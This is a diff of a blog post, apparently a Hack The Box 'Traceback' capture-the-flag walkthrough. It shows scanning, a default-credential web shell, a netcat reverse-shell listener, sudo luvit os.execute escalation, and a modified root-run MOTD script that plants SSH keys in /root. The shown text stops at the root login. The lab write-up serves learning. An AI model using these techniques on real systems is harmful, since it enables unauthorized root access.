@@ -5,6 +5,9 @@
     <link href='../css/style.css' media='screen' rel='stylesheet' type='text/css' />
     <link href='../css/blog.css' media='screen' rel='stylesheet' type='text/css' />
     <link href='../css/post.css' media='screen' rel='stylesheet' type='text/css' />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="../css/atom-one-dark-reasonable.min.css">
+    <script src="../js/highlight.min.js"></script>
     <title>HTB: Traceback Writeup | matt johnson</title>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
     <link rel="icon" type="image/png" href="../img/favicon.png">
@@ -16,6 +19,7 @@
 </head>
 
 <body>
+    <script>hljs.highlightAll();</script>
     <div id="title">
         <a href="../index.html">
             <h1>mj&gt;<div id="animation"><span>_</span></div></h1>
@@ -35,32 +39,31 @@
         <div>
         <h3>Initial Foothold</h3>
         <p>As always, I began by running Nmap:</p>
-        <pre><code>matt@kali:~$&nbsp;/opt/stagednmap.sh&nbsp;10.10.10.181
-         Starting&nbsp;Nmap&nbsp;7.80&nbsp;(&nbsp;https://nmap.org&nbsp;)&nbsp;at&nbsp;2020-06-21&nbsp;11:43&nbsp;CDT
-         Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;10.10.10.181
-         Host&nbsp;is&nbsp;up&nbsp;(0.057s&nbsp;latency).
-         Not&nbsp;shown:&nbsp;65533&nbsp;closed&nbsp;ports
-         PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE
-         22/tcp&nbsp;open&nbsp;&nbsp;ssh
-         80/tcp&nbsp;open&nbsp;&nbsp;http
-         Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;35.99&nbsp;seconds
-         Starting&nbsp;Nmap&nbsp;7.80&nbsp;(&nbsp;https://nmap.org&nbsp;)&nbsp;at&nbsp;2020-06-21&nbsp;11:43&nbsp;CDT
-         Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;10.10.10.181
-         Host&nbsp;is&nbsp;up&nbsp;(0.053s&nbsp;latency).
-         PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION
-         22/tcp&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.6p1&nbsp;Ubuntu&nbsp;4ubuntu0.3&nbsp;(Ubuntu&nbsp;Linux;&nbsp;protocol&nbsp;2.0)
-         |&nbsp;ssh-hostkey:
-         |&nbsp;&nbsp;&nbsp;2048&nbsp;96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28&nbsp;(RSA)
-         |&nbsp;&nbsp;&nbsp;256&nbsp;54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d&nbsp;(ECDSA)
-         |_&nbsp;&nbsp;256&nbsp;4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86&nbsp;(ED25519)
-         80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.29&nbsp;((Ubuntu))
-         |_http-server-header:&nbsp;Apache/2.4.29&nbsp;(Ubuntu)
-         |_http-title:&nbsp;Help&nbsp;us
-         Service&nbsp;Info:&nbsp;OS:&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel
-         Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.
-         Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;9.42&nbsp;seconds
-         matt@kali:~$
-         </code></pre>
+        <pre><code class="language-shell">matt@kali:~$&nbsp;/opt/stagednmap.sh&nbsp;10.10.10.181
+Starting&nbsp;Nmap&nbsp;7.80&nbsp;(&nbsp;https://nmap.org&nbsp;)&nbsp;at&nbsp;2020-06-21&nbsp;11:43&nbsp;CDT
+Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;10.10.10.181
+Host&nbsp;is&nbsp;up&nbsp;(0.057s&nbsp;latency).
+Not&nbsp;shown:&nbsp;65533&nbsp;closed&nbsp;ports
+PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE
+22/tcp&nbsp;open&nbsp;&nbsp;ssh
+80/tcp&nbsp;open&nbsp;&nbsp;http
+Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;35.99&nbsp;seconds
+Starting&nbsp;Nmap&nbsp;7.80&nbsp;(&nbsp;https://nmap.org&nbsp;)&nbsp;at&nbsp;2020-06-21&nbsp;11:43&nbsp;CDT
+Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;10.10.10.181
+Host&nbsp;is&nbsp;up&nbsp;(0.053s&nbsp;latency).
+PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION
+22/tcp&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.6p1&nbsp;Ubuntu&nbsp;4ubuntu0.3&nbsp;(Ubuntu&nbsp;Linux;&nbsp;protocol&nbsp;2.0)
+|&nbsp;ssh-hostkey:
+|&nbsp;&nbsp;&nbsp;2048&nbsp;96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28&nbsp;(RSA)
+|&nbsp;&nbsp;&nbsp;256&nbsp;54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d&nbsp;(ECDSA)
+|_&nbsp;&nbsp;256&nbsp;4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86&nbsp;(ED25519)
+80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.29&nbsp;((Ubuntu))
+|_http-server-header:&nbsp;Apache/2.4.29&nbsp;(Ubuntu)
+|_http-title:&nbsp;Help&nbsp;us
+Service&nbsp;Info:&nbsp;OS:&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel
+Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.
+Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;9.42&nbsp;seconds
+matt@kali:~$</code></pre>
         <p>With only ports 22 and 80 open, I began to enumerate the website:</p>
         <img src="../../img/posts/traceback/web-main.png" alt="" /> <img src="../../img/posts/traceback/web-404.png" alt="" />
         <p>Interestingly, the page claimed that the site had been "owned" and that there was a backdoor. Unfortunately, additional details were pretty sparse, so I decided to move on.</p>
@@ -71,137 +74,130 @@
         <p>The default credentials of <code>admin:admin</code> were accepted, and I was brought to a console that seemingly let me remotely execute code.</p>
         <p>After testing to ensure that it actually did what it purported to do, I ran a Perl script that resulted in a low shell:</p>
         <img src="../../img/posts/traceback/web-shell-gotuser.png" alt="" />
-        <pre><code>matt@kali:~$&nbsp;sudo&nbsp;netcat&nbsp;-nvlp&nbsp;1234
-         listening&nbsp;on&nbsp;[any]&nbsp;1234&nbsp;...
-         connect&nbsp;to&nbsp;[10.10.14.25]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.181]&nbsp;55922
-         /bin/sh:&nbsp;0:&nbsp;can't&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off
-         $&nbsp;whoami
-         webadmin
-         $&nbsp;id
-         uid=1000(webadmin)&nbsp;gid=1000(webadmin)&nbsp;groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
-         $
-         </code></pre>
+        <pre><code class="language-shell">matt@kali:~$&nbsp;sudo&nbsp;netcat&nbsp;-nvlp&nbsp;1234
+listening&nbsp;on&nbsp;[any]&nbsp;1234&nbsp;...
+connect&nbsp;to&nbsp;[10.10.14.25]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.181]&nbsp;55922
+/bin/sh:&nbsp;0:&nbsp;can't&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off
+$&nbsp;whoami
+webadmin
+$&nbsp;id
+uid=1000(webadmin)&nbsp;gid=1000(webadmin)&nbsp;groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
+$</code></pre>
         </div>
         <div>
         <h3>Privilege Escalation</h3>
         <p>The account that I got a low shell on, <code>webadmin</code>, was relatively locked down and rightly so. However, it did have the ability to run <a href="https://luvit.io/">luvit</a> as the <code>sysadmin</code> user. Luvit has a built in ability to execute system code via the <code>os.execute()</code> function, which I used to get a less restrictive shell:</p>
-        <pre><code>webadmin@traceback:/var/www/html$&nbsp;sudo&nbsp;-H&nbsp;-u&nbsp;sysadmin&nbsp;/home/sysadmin/luvit
-         Welcome&nbsp;to&nbsp;the&nbsp;Luvit&nbsp;repl!
-         &gt;&nbsp;os.execute&nbsp;("whoami")
-         sysadmin
-         true&nbsp;&nbsp;&nbsp;&nbsp;'exit'&nbsp;&nbsp;0
-         &gt;&nbsp;os.execute&nbsp;("pwd")
-         /var/www/html
-         true&nbsp;&nbsp;&nbsp;&nbsp;'exit'&nbsp;&nbsp;0
-         &gt;&nbsp;os.execute&nbsp;("ls&nbsp;/home/sysadmin")
-         luvit&nbsp;&nbsp;user.txt
-         true&nbsp;&nbsp;&nbsp;&nbsp;'exit'&nbsp;&nbsp;0
-         &gt;&nbsp;os.execute&nbsp;("ls&nbsp;-la&nbsp;/home/sysadmin")
-         total&nbsp;4340
-         drwxr-x---&nbsp;5&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Jun&nbsp;21&nbsp;10:54&nbsp;.
-         drwxr-xr-x&nbsp;4&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Aug&nbsp;25&nbsp;&nbsp;2019&nbsp;..
-         -rw-------&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;Aug&nbsp;25&nbsp;&nbsp;2019&nbsp;.bash_history
-         -rw-r--r--&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;220&nbsp;Apr&nbsp;&nbsp;4&nbsp;&nbsp;2018&nbsp;.bash_logout
-         -rw-r--r--&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;3771&nbsp;Apr&nbsp;&nbsp;4&nbsp;&nbsp;2018&nbsp;.bashrc
-         drwx------&nbsp;2&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Aug&nbsp;25&nbsp;&nbsp;2019&nbsp;.cache
-         drwxrwxr-x&nbsp;3&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Aug&nbsp;24&nbsp;&nbsp;2019&nbsp;.local
-         -rw-r--r--&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;177&nbsp;Jun&nbsp;21&nbsp;10:58&nbsp;.luvit_history
-         -rw-r--r--&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;807&nbsp;Apr&nbsp;&nbsp;4&nbsp;&nbsp;2018&nbsp;.profile
-         drwxr-xr-x&nbsp;2&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Aug&nbsp;25&nbsp;&nbsp;2019&nbsp;.ssh
-         -rwxrwxr-x&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;4397566&nbsp;Aug&nbsp;24&nbsp;&nbsp;2019&nbsp;luvit
-         -rw-------&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;33&nbsp;Jun&nbsp;19&nbsp;15:13&nbsp;user.txt
-         true&nbsp;&nbsp;&nbsp;&nbsp;'exit'&nbsp;&nbsp;0
-         &gt;&nbsp;os.execute&nbsp;("/bin/bash&nbsp;-i")
-         sysadmin@traceback:/var/www/html$
-         </code></pre>
+        <pre><code class="language-shell">webadmin@traceback:/var/www/html$&nbsp;sudo&nbsp;-H&nbsp;-u&nbsp;sysadmin&nbsp;/home/sysadmin/luvit
+Welcome&nbsp;to&nbsp;the&nbsp;Luvit&nbsp;repl!
+&gt;&nbsp;os.execute&nbsp;("whoami")
+sysadmin
+true&nbsp;&nbsp;&nbsp;&nbsp;'exit'&nbsp;&nbsp;0
+&gt;&nbsp;os.execute&nbsp;("pwd")
+/var/www/html
+true&nbsp;&nbsp;&nbsp;&nbsp;'exit'&nbsp;&nbsp;0
+&gt;&nbsp;os.execute&nbsp;("ls&nbsp;/home/sysadmin")
+luvit&nbsp;&nbsp;user.txt
+true&nbsp;&nbsp;&nbsp;&nbsp;'exit'&nbsp;&nbsp;0
+&gt;&nbsp;os.execute&nbsp;("ls&nbsp;-la&nbsp;/home/sysadmin")
+total&nbsp;4340
+drwxr-x---&nbsp;5&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Jun&nbsp;21&nbsp;10:54&nbsp;.
+drwxr-xr-x&nbsp;4&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Aug&nbsp;25&nbsp;&nbsp;2019&nbsp;..
+-rw-------&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;Aug&nbsp;25&nbsp;&nbsp;2019&nbsp;.bash_history
+-rw-r--r--&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;220&nbsp;Apr&nbsp;&nbsp;4&nbsp;&nbsp;2018&nbsp;.bash_logout
+-rw-r--r--&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;3771&nbsp;Apr&nbsp;&nbsp;4&nbsp;&nbsp;2018&nbsp;.bashrc
+drwx------&nbsp;2&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Aug&nbsp;25&nbsp;&nbsp;2019&nbsp;.cache
+drwxrwxr-x&nbsp;3&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Aug&nbsp;24&nbsp;&nbsp;2019&nbsp;.local
+-rw-r--r--&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;177&nbsp;Jun&nbsp;21&nbsp;10:58&nbsp;.luvit_history
+-rw-r--r--&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;807&nbsp;Apr&nbsp;&nbsp;4&nbsp;&nbsp;2018&nbsp;.profile
+drwxr-xr-x&nbsp;2&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4096&nbsp;Aug&nbsp;25&nbsp;&nbsp;2019&nbsp;.ssh
+-rwxrwxr-x&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;4397566&nbsp;Aug&nbsp;24&nbsp;&nbsp;2019&nbsp;luvit
+-rw-------&nbsp;1&nbsp;sysadmin&nbsp;sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;33&nbsp;Jun&nbsp;19&nbsp;15:13&nbsp;user.txt
+true&nbsp;&nbsp;&nbsp;&nbsp;'exit'&nbsp;&nbsp;0
+&gt;&nbsp;os.execute&nbsp;("/bin/bash&nbsp;-i")
+sysadmin@traceback:/var/www/html$</code></pre>
         <p>As <code>sysadmin</code>, I ran linPEAS to see what possible vectors existed to get to root. One of the things that stood out was that all of the MOTD scripts were group-writable.</p>
         <p>For those who don't know, MOTD stands for "Message of the Day" and it is principally responsible for displaying the login message when someone logs in to a shell (via SSH, for example). What's convenient, for someone with malicious intent anyways, is that those login scripts are bash, which of course means you can do some pretty powerful stuff. In this case, those scripts were being executed as <code>root</code>!</p>
         <p>The script executed upon login is typically <code>00-header</code>:</p>
-        <pre><code>sysadmin@traceback:/etc/update-motd.d$&nbsp;cat&nbsp;00-header
-         #!/bin/sh
-         #
-         #&nbsp;&nbsp;&nbsp;&nbsp;00-header&nbsp;-&nbsp;create&nbsp;the&nbsp;header&nbsp;of&nbsp;the&nbsp;MOTD
-         #&nbsp;&nbsp;&nbsp;&nbsp;Copyright&nbsp;(C)&nbsp;2009-2010&nbsp;Canonical&nbsp;Ltd.
-         #
-         #&nbsp;&nbsp;&nbsp;&nbsp;Authors:&nbsp;Dustin&nbsp;Kirkland&nbsp;&lt;kirkland@canonical.com&gt;
-         #
-         #&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;program&nbsp;is&nbsp;free&nbsp;software;&nbsp;you&nbsp;can&nbsp;redistribute&nbsp;it&nbsp;and/or&nbsp;modify
-         #&nbsp;&nbsp;&nbsp;&nbsp;it&nbsp;under&nbsp;the&nbsp;terms&nbsp;of&nbsp;the&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;as&nbsp;published&nbsp;by
-         #&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;Free&nbsp;Software&nbsp;Foundation;&nbsp;either&nbsp;version&nbsp;2&nbsp;of&nbsp;the&nbsp;License,&nbsp;or
-         #&nbsp;&nbsp;&nbsp;&nbsp;(at&nbsp;your&nbsp;option)&nbsp;any&nbsp;later&nbsp;version.
-         #
-         #&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;program&nbsp;is&nbsp;distributed&nbsp;in&nbsp;the&nbsp;hope&nbsp;that&nbsp;it&nbsp;will&nbsp;be&nbsp;useful,
-         #&nbsp;&nbsp;&nbsp;&nbsp;but&nbsp;WITHOUT&nbsp;ANY&nbsp;WARRANTY;&nbsp;without&nbsp;even&nbsp;the&nbsp;implied&nbsp;warranty&nbsp;of
-         #&nbsp;&nbsp;&nbsp;&nbsp;MERCHANTABILITY&nbsp;or&nbsp;FITNESS&nbsp;FOR&nbsp;A&nbsp;PARTICULAR&nbsp;PURPOSE.&nbsp;&nbsp;See&nbsp;the
-         #&nbsp;&nbsp;&nbsp;&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;for&nbsp;more&nbsp;details.
-         #
-         #&nbsp;&nbsp;&nbsp;&nbsp;You&nbsp;should&nbsp;have&nbsp;received&nbsp;a&nbsp;copy&nbsp;of&nbsp;the&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;along
-         #&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;this&nbsp;program;&nbsp;if&nbsp;not,&nbsp;write&nbsp;to&nbsp;the&nbsp;Free&nbsp;Software&nbsp;Foundation,&nbsp;Inc.,
-         #&nbsp;&nbsp;&nbsp;&nbsp;51&nbsp;Franklin&nbsp;Street,&nbsp;Fifth&nbsp;Floor,&nbsp;Boston,&nbsp;MA&nbsp;02110-1301&nbsp;USA.
-         [&nbsp;-r&nbsp;/etc/lsb-release&nbsp;]&nbsp;&amp;&amp;&nbsp;.&nbsp;/etc/lsb-release
-         echo&nbsp;"\nWelcome&nbsp;to&nbsp;Xh4H&nbsp;land&nbsp;\n"
-         </code></pre>
+        <pre><code class="language-bash">#!/bin/sh
+#
+#&nbsp;&nbsp;&nbsp;&nbsp;00-header&nbsp;-&nbsp;create&nbsp;the&nbsp;header&nbsp;of&nbsp;the&nbsp;MOTD
+#&nbsp;&nbsp;&nbsp;&nbsp;Copyright&nbsp;(C)&nbsp;2009-2010&nbsp;Canonical&nbsp;Ltd.
+#
+#&nbsp;&nbsp;&nbsp;&nbsp;Authors:&nbsp;Dustin&nbsp;Kirkland&nbsp;&lt;kirkland@canonical.com&gt;
+#
+#&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;program&nbsp;is&nbsp;free&nbsp;software;&nbsp;you&nbsp;can&nbsp;redistribute&nbsp;it&nbsp;and/or&nbsp;modify
+#&nbsp;&nbsp;&nbsp;&nbsp;it&nbsp;under&nbsp;the&nbsp;terms&nbsp;of&nbsp;the&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;as&nbsp;published&nbsp;by
+#&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;Free&nbsp;Software&nbsp;Foundation;&nbsp;either&nbsp;version&nbsp;2&nbsp;of&nbsp;the&nbsp;License,&nbsp;or
+#&nbsp;&nbsp;&nbsp;&nbsp;(at&nbsp;your&nbsp;option)&nbsp;any&nbsp;later&nbsp;version.
+#
+#&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;program&nbsp;is&nbsp;distributed&nbsp;in&nbsp;the&nbsp;hope&nbsp;that&nbsp;it&nbsp;will&nbsp;be&nbsp;useful,
+#&nbsp;&nbsp;&nbsp;&nbsp;but&nbsp;WITHOUT&nbsp;ANY&nbsp;WARRANTY;&nbsp;without&nbsp;even&nbsp;the&nbsp;implied&nbsp;warranty&nbsp;of
+#&nbsp;&nbsp;&nbsp;&nbsp;MERCHANTABILITY&nbsp;or&nbsp;FITNESS&nbsp;FOR&nbsp;A&nbsp;PARTICULAR&nbsp;PURPOSE.&nbsp;&nbsp;See&nbsp;the
+#&nbsp;&nbsp;&nbsp;&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;for&nbsp;more&nbsp;details.
+#
+#&nbsp;&nbsp;&nbsp;&nbsp;You&nbsp;should&nbsp;have&nbsp;received&nbsp;a&nbsp;copy&nbsp;of&nbsp;the&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;along
+#&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;this&nbsp;program;&nbsp;if&nbsp;not,&nbsp;write&nbsp;to&nbsp;the&nbsp;Free&nbsp;Software&nbsp;Foundation,&nbsp;Inc.,
+#&nbsp;&nbsp;&nbsp;&nbsp;51&nbsp;Franklin&nbsp;Street,&nbsp;Fifth&nbsp;Floor,&nbsp;Boston,&nbsp;MA&nbsp;02110-1301&nbsp;USA.
+[&nbsp;-r&nbsp;/etc/lsb-release&nbsp;]&nbsp;&amp;&amp;&nbsp;.&nbsp;/etc/lsb-release
+echo&nbsp;"\nWelcome&nbsp;to&nbsp;Xh4H&nbsp;land&nbsp;\n"</code></pre>
         <p>To verify that this was actually the case, I added my RSA public key to the <code>sysadmin</code> user's <code>authorized_keys</code> file and logged in via SSH:</p>
-        <pre><code>matt@kali:~/.ssh$&nbsp;ssh&nbsp;-i&nbsp;id_rsa&nbsp;sysadmin@10.10.10.181
-         #################################
-         --------&nbsp;OWNED&nbsp;BY&nbsp;XH4H&nbsp;&nbsp;---------
-         -&nbsp;I&nbsp;guess&nbsp;stuff&nbsp;could&nbsp;have&nbsp;been&nbsp;configured&nbsp;better&nbsp;^^&nbsp;-
-         #################################
-         Welcome&nbsp;to&nbsp;Xh4H&nbsp;land
-         Last&nbsp;login:&nbsp;Mon&nbsp;Mar&nbsp;16&nbsp;03:50:24&nbsp;2020&nbsp;from&nbsp;10.10.14.2
-         $&nbsp;id
-         uid=1001(sysadmin)&nbsp;gid=1001(sysadmin)&nbsp;groups=1001(sysadmin)
-         $
-         </code></pre>
+        <pre><code class="language-shell">matt@kali:~/.ssh$&nbsp;ssh&nbsp;-i&nbsp;id_rsa&nbsp;sysadmin@10.10.10.181
+#################################
+--------&nbsp;OWNED&nbsp;BY&nbsp;XH4H&nbsp;&nbsp;---------
+-&nbsp;I&nbsp;guess&nbsp;stuff&nbsp;could&nbsp;have&nbsp;been&nbsp;configured&nbsp;better&nbsp;^^&nbsp;-
+#################################
+Welcome&nbsp;to&nbsp;Xh4H&nbsp;land
+Last&nbsp;login:&nbsp;Mon&nbsp;Mar&nbsp;16&nbsp;03:50:24&nbsp;2020&nbsp;from&nbsp;10.10.14.2
+$&nbsp;id
+uid=1001(sysadmin)&nbsp;gid=1001(sysadmin)&nbsp;groups=1001(sysadmin)
+$</code></pre>
         <p>It appeared as though that was the case, so from there the plan was straightforward. I modified the script to copy <code>/home/sysadmin/.ssh/authorized_keys</code> to <code>/root/.ssh/authorized_keys</code>, echoed a message to confirm that the modified script ran as desired, and logged in via SSH:</p>
-        <pre><code>#!/bin/bash
-         #
-         #&nbsp;&nbsp;&nbsp;&nbsp;00-header&nbsp;-&nbsp;create&nbsp;the&nbsp;header&nbsp;of&nbsp;the&nbsp;MOTD
-         #&nbsp;&nbsp;&nbsp;&nbsp;Copyright&nbsp;(C)&nbsp;2009-2010&nbsp;Canonical&nbsp;Ltd.
-         #
-         #&nbsp;&nbsp;&nbsp;&nbsp;Authors:&nbsp;Dustin&nbsp;Kirkland&nbsp;&lt;kirkland@canonical.com&gt;
-         #
-         #&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;program&nbsp;is&nbsp;free&nbsp;software;&nbsp;you&nbsp;can&nbsp;redistribute&nbsp;it&nbsp;and/or&nbsp;modify
-         #&nbsp;&nbsp;&nbsp;&nbsp;it&nbsp;under&nbsp;the&nbsp;terms&nbsp;of&nbsp;the&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;as&nbsp;published&nbsp;by
-         #&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;Free&nbsp;Software&nbsp;Foundation;&nbsp;either&nbsp;version&nbsp;2&nbsp;of&nbsp;the&nbsp;License,&nbsp;or
-         #&nbsp;&nbsp;&nbsp;&nbsp;(at&nbsp;your&nbsp;option)&nbsp;any&nbsp;later&nbsp;version.
-         #
-         #&nbsp;&nbsp;&nbsp;&nbsp;This&nbsp;program&nbsp;is&nbsp;distributed&nbsp;in&nbsp;the&nbsp;hope&nbsp;that&nbsp;it&nbsp;will&nbsp;be&nbsp;useful,
-         #&nbsp;&nbsp;&nbsp;&nbsp;but&nbsp;WITHOUT&nbsp;ANY&nbsp;WARRANTY;&nbsp;without&nbsp;even&nbsp;the&nbsp;implied&nbsp;warranty&nbsp;of
-         #&nbsp;&nbsp;&nbsp;&nbsp;MERCHANTABILITY&nbsp;or&nbsp;FITNESS&nbsp;FOR&nbsp;A&nbsp;PARTICULAR&nbsp;PURPOSE.&nbsp;&nbsp;See&nbsp;the
-         #&nbsp;&nbsp;&nbsp;&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;for&nbsp;more&nbsp;details.
-         #
-         #&nbsp;&nbsp;&nbsp;&nbsp;You&nbsp;should&nbsp;have&nbsp;received&nbsp;a&nbsp;copy&nbsp;of&nbsp;the&nbsp;GNU&nbsp;General&nbsp;Public&nbsp;License&nbsp;along
-         #&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;this&nbsp;program;&nbsp;if&nbsp;not,&nbsp;write&nbsp;to&nbsp;the&nbsp;Free&nbsp;Software&nbsp;Foundation,&nbsp;Inc.,
-         #&nbsp;&nbsp;&nbsp;&nbsp;51&nbsp;Franklin&nbsp;Street,&nbsp;Fifth&nbsp;Floor,&nbsp;Boston,&nbsp;MA&nbsp;02110-1301&nbsp;USA.
-         [&nbsp;-r&nbsp;/etc/lsb-release&nbsp;]&nbsp;&amp;&amp;&nbsp;.&nbsp;/etc/lsb-release
-         echo&nbsp;"\nWelcome&nbsp;to&nbsp;Xh4H&nbsp;land&nbsp;\n"
-         cp&nbsp;/home/sysadmin/.ssh/authorized_keys&nbsp;/root/.ssh/authorized_keys
-         echo&nbsp;'try&nbsp;logging&nbsp;in&nbsp;as&nbsp;root&nbsp;\n'
-         </code></pre>
-        <pre><code>matt@kali:~/.ssh$&nbsp;ssh&nbsp;-i&nbsp;id_rsa&nbsp;sysadmin@10.10.10.181
-         #################################
-         --------&nbsp;OWNED&nbsp;BY&nbsp;XH4H&nbsp;&nbsp;---------
-         -&nbsp;I&nbsp;guess&nbsp;stuff&nbsp;could&nbsp;have&nbsp;been&nbsp;configured&nbsp;better&nbsp;^^&nbsp;-
-         #################################
-         \nWelcome&nbsp;to&nbsp;Xh4H&nbsp;land&nbsp;\n
-         try&nbsp;logging&nbsp;in&nbsp;as&nbsp;root&nbsp;\n
-         Failed&nbsp;to&nbsp;connect&nbsp;to&nbsp;https://changelogs.ubuntu.com/meta-release-lts.&nbsp;Check&nbsp;your&nbsp;Internet&nbsp;connection&nbsp;or&nbsp;proxy&nbsp;settings
-         Last&nbsp;login:&nbsp;Sat&nbsp;Jun&nbsp;27&nbsp;09:29:38&nbsp;2020&nbsp;from&nbsp;10.10.14.35
-         $&nbsp;exit
-         Connection&nbsp;to&nbsp;10.10.10.181&nbsp;closed.
-         matt@kali:~/.ssh$&nbsp;ssh&nbsp;-i&nbsp;id_rsa&nbsp;root@10.10.10.181
-         #################################
